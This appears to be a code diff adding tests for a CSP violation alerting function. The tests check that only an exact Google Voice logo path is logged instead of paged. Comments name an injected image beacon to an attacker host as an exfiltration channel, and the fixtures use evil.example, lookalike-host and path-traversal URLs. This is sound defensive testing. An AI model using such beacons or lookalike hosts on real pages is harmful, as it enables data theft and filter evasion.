@@ -439,7 +439,8 @@ describe("the injected passive third-party class (#3417)", () => {
   it("does NOT log-only img-src, style-src or media-src: they are data-exfil channels and keep paging", async () => {
     // An injected `<img src=attacker/?d=...>` beacon or a CSS exfil is refused on these,
     // so a third-party refusal there may signal an injection attempt worth a page. Only
-    // font-src is suppressed.
+    // font-src is suppressed, plus the one Google product logo path under img-src (#3699,
+    // below); this font path on the same host is not it.
     const { cspViolationPage } = await import("./csp");
     for (const directive of ["img-src", "style-src", "media-src"]) {
       const d = cspViolationPage(summariseViolation(report({ "violated-directive": directive })));
@@ -477,5 +478,91 @@ describe("the injected passive third-party class (#3417)", () => {
     const { cspViolationPage } = await import("./csp");
     const d = cspViolationPage(summariseViolation(report({ "document-uri": "not a url" })));
     expect(d.page).toBe(true);
+  });
+});
+
+describe("the Google product logo an add-on injects, refused under img-src (#3699)", () => {
+  // A browser add-on draws Google Voice's "click to call" logo beside a phone number, and
+  // the enforced policy refuses it under img-src. Slate never loads it. It is logged, not
+  // paged, ONLY for that exact host AND the product logo path, with no named source: an
+  // image request to Google's own host carries nothing an attacker can collect. Every
+  // other refused image keeps paging, because a third-party image can be an injected
+  // exfiltration beacon (<img src=https://attacker/?d=...>).
+  const VOICE_LOGO =
+    "https://fonts.gstatic.com/s/i/productlogos/voice_2020q4/v7/web-24dp/logo_voice_2020q4_color_2x_web_24dp.png";
+  const report = (over: Record<string, unknown> = {}) => ({
+    "csp-report": {
+      "document-uri": "https://slate.trypennie.app/book?xbc=411",
+      referrer: "https://trypennie.com/",
+      "violated-directive": "img-src",
+      "blocked-uri": VOICE_LOGO,
+      disposition: "enforce",
+      ...over,
+    },
+  });
+
+  it("logs, rather than pages, the Google Voice logo refused with no source", async () => {
+    const { cspViolationPage } = await import("./csp");
+    expect(cspViolationPage(summariseViolation(report()))).toEqual({ page: false, why: "injected-passive" });
+  });
+
+  it("logs it on the manage page too, where the token is redacted out of the document", async () => {
+    const { cspViolationPage } = await import("./csp");
+    const d = cspViolationPage(summariseViolation(report({ "document-uri": "https://slate.trypennie.app/booking/manage/tok-secret" })));
+    expect(d).toEqual({ page: false, why: "injected-passive" });
+  });
+
+  it("logs it when an older browser reports the directive with its values", async () => {
+    const { cspViolationPage } = await import("./csp");
+    const d = cspViolationPage(summariseViolation(report({ "violated-directive": "img-src 'self' data:" })));
+    expect(d).toEqual({ page: false, why: "injected-passive" });
+  });
+
+  it("still pages an image from the same host under any other path", async () => {
+    const { cspViolationPage } = await import("./csp");
+    for (const blocked of [
+      "https://fonts.gstatic.com/s/mulish/x.woff2",
+      "https://fonts.gstatic.com/s/i/other/logo.png",
+      "https://fonts.gstatic.com/s/i/productlogosX/logo.png",
+      "https://fonts.gstatic.com/x/s/i/productlogos/logo.png",
+      "https://fonts.gstatic.com/",
+      "https://fonts.gstatic.com/s/i/productlogos/../../../beacon.png",
+    ]) {
+      expect(cspViolationPage(summariseViolation(report({ "blocked-uri": blocked }))).page, blocked).toBe(true);
+    }
+  });
+
+  it("still pages the product logo path on any other host, a look alike or a port included", async () => {
+    const { cspViolationPage } = await import("./csp");
+    for (const blocked of [
+      "https://evil.example/s/i/productlogos/voice_2020q4/v7/web-24dp/logo.png",
+      "https://fonts.gstatic.com.evil.example/s/i/productlogos/logo.png",
+      "https://evilfonts.gstatic.com/s/i/productlogos/logo.png",
+      "https://www.gstatic.com/s/i/productlogos/logo.png",
+      "https://fonts.gstatic.com:8443/s/i/productlogos/logo.png",
+      "http://fonts.gstatic.com/s/i/productlogos/logo.png",
+      "https://lh4.googleusercontent.com/s/i/productlogos/logo.png",
+    ]) {
+      expect(cspViolationPage(summariseViolation(report({ "blocked-uri": blocked }))).page, blocked).toBe(true);
+    }
+  });
+
+  it("still pages the Voice logo when the report NAMES a source", async () => {
+    const { cspViolationPage } = await import("./csp");
+    const d = cspViolationPage(summariseViolation(report({ "source-file": "https://slate.trypennie.app/_next/static/chunks/a.js" })));
+    expect(d.page).toBe(true);
+  });
+
+  it("still pages the Voice logo URL under any directive but img-src", async () => {
+    const { cspViolationPage } = await import("./csp");
+    for (const directive of ["style-src", "media-src", "connect-src", "script-src", "frame-src"]) {
+      expect(cspViolationPage(summariseViolation(report({ "violated-directive": directive }))).page, directive).toBe(true);
+    }
+  });
+
+  it("CONTROL: another refused image from that host pages under the img-src key", async () => {
+    const { cspViolationPage } = await import("./csp");
+    const d = cspViolationPage(summariseViolation(report({ "blocked-uri": "https://fonts.gstatic.com/s/i/other/logo.png" })));
+    expect(d).toMatchObject({ page: true, key: "csp_violation:img-src", directive: "img-src" });
   });
 });
